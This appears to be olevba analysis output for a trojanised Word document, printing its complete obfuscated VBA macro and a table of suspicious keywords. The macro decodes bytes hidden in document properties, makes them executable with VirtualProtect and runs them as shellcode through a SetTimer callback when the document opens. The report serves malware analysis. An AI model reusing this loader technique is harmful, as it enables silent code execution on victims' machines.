olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-fc091bfa7e9843135729e58819c7af578159c5afbe7414476d11acb7b69bac28
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/NAwGjRfhGt.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function PostmillennianDocksThymelaeales Lib "user32" Alias "KillTimer" (ByVal LibridParoquet As LongPtr, ByVal OctangleMaltreatorLiplet As LongPtr) As LongPtr
#Else
Private Declare Function SamothracianHeteroscedasticity Lib "user32" Alias "SetTimer" ( ByVal ObfuscateTonganColonials As Long, ByVal MyopiesDemonocracyRobin As Long, ByVal AtropineTransplantedDovecot As Long, ByVal MadshipCarvage As Any) As Long
#End If
#If VBA7 Then
Private Declare PtrSafe Function SamothracianHeteroscedasticity Lib "user32" Alias "SetTimer" (ByVal AldamineJarvieUnmiter As LongPtr, ByVal UnvicarFinablenessReckla As LongPtr, ByVal FerraraBesotment As LongPtr, ByVal NullosChronica As LongPtr) As LongPtr
Private Declare PtrSafe Function CatfightFontinalis Lib "kernel32" Alias "VirtualProtect" (ByVal UnqualifyinglyNonrepetitiouslyDistances As LongPtr, ByVal DeputisedConfabulationsHierarchical As LongPtr, ByVal EthologiesPiroshki As LongPtr, AcridinExcretion As LongPtr) As LongPtr
#Else
Private Declare Function CatfightFontinalis Lib "kernel32" Alias "VirtualProtect"  (ByVal FreesilverismInrushesEndocrinopathic As Long, ByVal ImbreviatedMisconstructions As Long, ByVal DrowninglyIntermit As Long, ReorganizerYawpedDinoflagellida As Long) As Long
Private Declare Function PostmillennianDocksThymelaeales Lib "user32" Alias "KillTimer" ( ByVal VacuationUnsagging As Long, ByVal PorailSequentializing As Long) As Long
#End If
Private Sub Document_Open()
Dim PientaoAvidin() As Byte
#If Win64 Then
PientaoAvidin = RopeworkChilomastix(ActiveDocument.BuiltInDocumentProperties(Kpdm7gZSJ7("lwu2Lt6Z6")).Value)
#Else
PientaoAvidin = RopeworkChilomastix(ActiveDocument.BuiltInDocumentProperties(Kpdm7gZSJ7("aBSDfQq3mH")).Value)
#End If
#If VBA7 Then
Dim SuperultrafrostifiedUndeprivable As LongPtr
Dim CeriopsNaloxone As LongPtr
Dim DatisiAdditory As LongPtr
Dim StruseInterferes As LongPtr
#Else
Dim SuperultrafrostifiedUndeprivable As Long
Dim CeriopsNaloxone As Long
Dim DatisiAdditory As Long
Dim StruseInterferes As Long
#End If
CeriopsNaloxone = UBound(PientaoAvidin) + 1
DatisiAdditory = VarPtr(PientaoAvidin(0))
CatfightFontinalis DatisiAdditory, CeriopsNaloxone, 64, VarPtr(SuperultrafrostifiedUndeprivable)
GetObject(Kpdm7gZSJ7("UkRc7X0HF")).Environment(Kpdm7gZSJ7("EwW4UTMPU1"))(Kpdm7gZSJ7("X0Cq9m")) = Kpdm7gZSJ7("v9efZVNTw")
StruseInterferes = SamothracianHeteroscedasticity(0, DatisiAdditory, 1, DatisiAdditory)
GypsousDisinsectization 1
PostmillennianDocksThymelaeales 0, StruseInterferes
GetObject(Kpdm7gZSJ7("zFyAkq3UE")).Environment(Kpdm7gZSJ7("MhYvX0RYPS")).Remove (Kpdm7gZSJ7("MHVys57L"))
GetObject(Kpdm7gZSJ7("a0VWB91U")).Environment(Kpdm7gZSJ7("NUaCQBd")).Remove (Kpdm7gZSJ7("QzdnJzu_ZZnR"))
ReDim PientaoAvidin(1)
End Sub
Public Function Kpdm7gZSJ7(strInput)
Kpdm7gZSJ7 = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Sub GypsousDisinsectization(Finish)
Dim DissipatersFemora As Long
Dim StatutesTaonurus As Long
StatutesTaonurus = Timer() + (Finish)
Do
DissipatersFemora = Timer()
DoEvents
Loop Until DissipatersFemora > StatutesTaonurus
End Sub
Function ClerisyGallbladdersDairywoman(MetacarpalFleecelessStenothermy, OverintensifyPeriganglionic)
ClerisyGallbladdersDairywoman = Mid(MetacarpalFleecelessStenothermy, OverintensifyPeriganglionic + 1, 1)
End Function
Function ChalothChorotegaOvertaxing(RamphastidesAchylousSupermundane) As Long
If Int(Rnd(23)) > 2 Then
ChalothChorotegaOvertaxing = 9000
Else
ChalothChorotegaOvertaxing = Len(RamphastidesAchylousSupermundane)
End If
End Function
Function RopeworkChilomastix(PulmoniferaSamshuPrenomina)
ReDim PrimroseInsistureSymbranchous(ChalothChorotegaOvertaxing(PulmoniferaSamshuPrenomina) - 1) As Byte
Dim EvergreenPoisonedDistritbutes As Long, HistoplasminStoechiology As Long
Dim ManucaptorGlyceriaUntruths: ManucaptorGlyceriaUntruths = Kpdm7gZSJ7("MsuSvSH0gXp2") & Kpdm7gZSJ7("QJdrbBWT")
For EvergreenPoisonedDistritbutes = 0 To ChalothChorotegaOvertaxing(PulmoniferaSamshuPrenomina) - 1 Step 2
HistoplasminStoechiology = EvergreenPoisonedDistritbutes / 2
PrimroseInsistureSymbranchous(HistoplasminStoechiology) = CDec(ManucaptorGlyceriaUntruths & ClerisyGallbladdersDairywoman(PulmoniferaSamshuPrenomina, EvergreenPoisonedDistritbutes) & ClerisyGallbladdersDairywoman(PulmoniferaSamshuPrenomina, EvergreenPoisonedDistritbutes + 1))
Next
RopeworkChilomastix = PrimroseInsistureSymbranchous
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

